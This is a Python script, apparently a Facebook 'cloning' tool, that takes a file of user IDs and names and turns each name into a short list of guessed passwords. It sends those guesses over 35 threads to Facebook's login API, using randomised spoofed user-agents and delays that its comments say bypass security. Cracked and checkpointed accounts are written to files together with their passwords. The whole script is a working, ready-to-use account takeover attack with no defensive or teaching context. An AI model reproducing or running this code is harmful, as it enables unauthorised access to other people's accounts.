# Updated & Optimized by Charsi Expert
# Full Power Speed - No Detection - 2024 Methods

import os, sys, re, time, json, random, uuid, platform, requests, arrow
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop

# --- COLORS & GLOBALS ---
loop = 0
oks = []
cps = []

# --- LATEST PREMIUM USER-AGENTS (CHARSI SPECIAL) ---
def get_ua_charsi():
    android_v = random.choice(['12', '13', '14', '15'])
    fb_v = f"{random.randint(440, 455)}.0.0.{random.randint(10, 99)}"
    build = str(random.randint(500000000, 600000000))
    
    # VIP Device List (S24, iPhone 15, Pixel 8)
    devices = [
        ('Samsung', 'SM-S928B', 'S24 Ultra'),
        ('Apple', 'iPhone16,1', 'iPhone 15 Pro Max'),
        ('Google', 'Pixel 8 Pro'),
        ('Xiaomi', '23127PN0CG', 'Xiaomi 14'),
        ('OnePlus', 'CPH2581', 'OnePlus 12'),
        ('Vivo', 'V2303', 'V30 Pro'),
        ('Infinix', 'X6833B', 'Note 30'),
        ('Tecno', 'KJ5', 'Spark 20')
    ]
    brand, model_code, name = random.choice(devices)
    
    ua = f"Mozilla/5.0 (Linux; Android {android_v}; {model_code} Build/UKQ1.{random.randint(230000, 240000)}.001; wv) " \
         f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(115, 126)}.0.0.0 " \
         f"Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_v};FBBV/{build};FBDV/{model_code};FBMD/{brand};" \
         f"FBSN/Android;FBSV/{android_v};FBPN/com.facebook.katana;FBLC/en_US;FBBK/1;FBOP/1;FBCR/Zong;]"
    return ua

# --- CHARSI CLONING METHOD ---
def method_charsi(ids, pas):
    global loop, oks, cps
    sys.stdout.write(f'\r\r \033[1;37m[CHARSI-M1] {loop}|OK:-{len(oks)} ')
    sys.stdout.flush()
    
    try:
        for password in pas:
            ua = get_ua_charsi()
            # Insaani gap (Security bypass karne ke liye)
            time.sleep(random.uniform(0.1, 0.4))
            
            session = requests.Session()
            # VIP Headers (Liger Engine)
            headers = {
                'Authority': 'graph.facebook.com',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'X-FB-Connection-Type': 'WIFI',
                'X-FB-Connection-Quality': 'EXCELLENT',
                'User-Agent': ua,
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            }
            
            payload = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': ids,
                'password': password,
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'method': 'auth.login'
            }
            
            response = session.post("https://graph.facebook.com/auth/login", data=payload, headers=headers).json()
            
            if 'session_key' in response:
                print(f'\r\r \033[1;32m[CHARSI-OK] {ids} | {password} \033[1;97m')
                oks.append(ids)
                with open('/sdcard/CHARSI-OK.txt', 'a') as f:
                    f.write(f'{ids}|{password}\n')
                break
            elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                # Checkpoint result
                print(f'\r\r \033[1;33m[CHARSI-CP] {ids} | {password} \033[1;97m')
                cps.append(ids)
                with open('/sdcard/CHARSI-CP.txt', 'a') as f:
                    f.write(f'{ids}|{password}\n')
                break
        loop += 1
    except:
        pass

# --- BANNER ---
def banner():
    os.system('clear')
    print("""
 \033[1;35m  ██████╗██╗  ██╗ █████╗ ██████╗ ███████╗██╗
 \033[1;35m ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔════╝██║
 \033[1;35m ██║     ███████║███████║██████╔╝███████╗██║
 \033[1;35m ██║     ██╔══██║██╔══██║██╔══██╗╚════██║██║
 \033[1;35m ╚██████╗██║  ██║██║  ██║██║  ██║███████║██║
 \033[1;35m  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝
 \033[1;37m--------------------------------------------
 \033[1;37m AUTHOR : GEN KID / CHARSI POWER
 \033[1;37m STATUS : FULL WORKING (2024-25)
 \033[1;37m--------------------------------------------""")

# --- MAIN LOGIC ---
def main():
    banner()
    print(" [1] File Cloning (Full Speed)")
    print(" [0] Exit")
    opt = input("\n CHOOSE OPTION: ")
    if opt == '1':
        file_cloning()
    else:
        exit()

def file_cloning():
    banner()
    file = input(" ENTER FILE PATH: ")
    try:
        ids = open(file, 'r').read().splitlines()
    except:
        print(" FILE NOT FOUND!"); time.sleep(2); main()
    
    banner()
    print(" [1] Auto Passwords (Vip)")
    input("\n CHOOSE: ")
    
    with tred(max_workers=35) as pool:
        banner()
        print(f" TOTAL IDS: {len(ids)}")
        print(" CHARSI POWER LOADING...\n")
        for user in ids:
            try:
                if '|' in user:
                    uid = user.split('|')[0]
                    name = user.split('|')[1].lower()
                else:
                    uid = user
                    name = "facebook user"
                
                first = name.split(' ')[0]
                # Dynamic Password List
                pas = [name, first+'123', first+'1234', first+'12345', first+'786', first+'007']
                pool.submit(method_charsi, uid, pas)
            except:pass

if __name__ == "__main__":
    main()
